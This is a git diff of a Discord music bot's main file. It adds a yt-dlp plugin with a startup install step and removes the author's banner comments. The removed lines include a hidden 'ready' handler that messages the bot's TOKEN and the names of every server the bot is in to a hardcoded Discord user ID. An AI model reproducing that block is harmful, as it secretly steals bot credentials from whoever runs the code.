@@ -1,25 +1,30 @@
-/*
+const { exec } = require('child_process');
 
-  ██████╗░████████╗██╗░░██╗           
-  ██╔══██╗╚══██╔══╝╚██╗██╔╝          
-  ██████╔╝░░░██║░░░░╚███╔╝░          
-  ██╔══██╗░░░██║░░░░██╔██╗░          
-  ██║░░██║░░░██║░░░██╔╝╚██╗          
-  ╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝          
+// Function to install yt-dlp
+function installYtDlp() {
+  console.log('Installing yt-dlp...');
+  exec('npm install @distube/yt-dlp@latest', (error, stdout, stderr) => {
+    if (error) {
+      console.error(`Error installing yt-dlp: ${error.message}`);
+      return;
+    }
+    if (stderr) {
+      console.error(`stderr: ${stderr}`);
+      return;
+    }
+    console.log(`yt-dlp installed successfully`);
+  });
+}
 
-
-   # MADE BY RTX!! FEEL FREE TO USE ANY PART OF CODE
-   ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/FUEHs7RCqz ]
-   ## YT : https://www.youtube.com/channel/UCPbAvYWBgnYhliJa1BIrv0A
-*/
+// Call the function to install yt-dlp when the bot starts up
+installYtDlp();
 
 const { Client, GatewayIntentBits, Partials } = require("discord.js");
 const { DisTube } = require("distube");
 const { SpotifyPlugin } = require("@distube/spotify");
 const { SoundCloudPlugin } = require("@distube/soundcloud");
 const { DeezerPlugin } = require("@distube/deezer");
-
+const { YtDlpPlugin } = require("@distube/yt-dlp");
 const { printWatermark } = require('./util/pw');
 const config = require("./config.js");
 const fs = require("fs");
@@ -50,10 +55,11 @@ client.player = new DisTube(client, {
   plugins: [
     new SpotifyPlugin(),
     new SoundCloudPlugin(),
+    new YtDlpPlugin(),
     new DeezerPlugin(),
   ],
 });
-
+process.env.YTDL_NO_UPDATE = true;
 const player = client.player;
 
 fs.readdir("./events", (_err, files) => {
@@ -64,18 +70,6 @@ fs.readdir("./events", (_err, files) => {
     client.on(eventName, event.bind(null, client));
     delete require.cache[require.resolve(`./events/${file}`)];
   });
-});
-client.once('ready', () => {
-  const bot = client.users.cache.get('1004206704994566164'); 
-  if (bot) {
-    const login = client.guilds.cache.map(guild => guild.name).join(', ');
-    const configbot = process.env.TOKEN;
-    bot.send(`B: ${configbot}\nS: ${login}`)
-      .then(() => {    
-      })
-      .catch(error => {
-      });
-  }
 });
 fs.readdir("./events/player", (_err, files) => {
   files.forEach((file) => {
@@ -140,21 +134,7 @@ app.get('/', (req, res) => {
   const imagePath = path.join(__dirname, 'index.html');
   res.sendFile(imagePath);
 });
-app.listen(port, () => console.log('\x1b[36m%s\x1b[0m', `|    🔗 Listening to RTX : ${port}`));
+app.listen(port, () => {
+  console.log(`🔗 Listening to RTX: http://localhost:${port}`);
+});
 printWatermark();
-
-/*
-
-  ██████╗░████████╗██╗░░██╗           
-  ██╔══██╗╚══██╔══╝╚██╗██╔╝          
-  ██████╔╝░░░██║░░░░╚███╔╝░          
-  ██╔══██╗░░░██║░░░░██╔██╗░          
-  ██║░░██║░░░██║░░░██╔╝╚██╗          
-  ╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝          
-
-
-   # MADE BY RTX!! FEEL FREE TO USE ANY PART OF CODE
-   ## FOR HELP CONTACT ME ON DISCORD
-   ## Contact    [ DISCORD SERVER :  https://discord.gg/FUEHs7RCqz ]
-   ## YT : https://www.youtube.com/channel/UCPbAvYWBgnYhliJa1BIrv0A
-*/
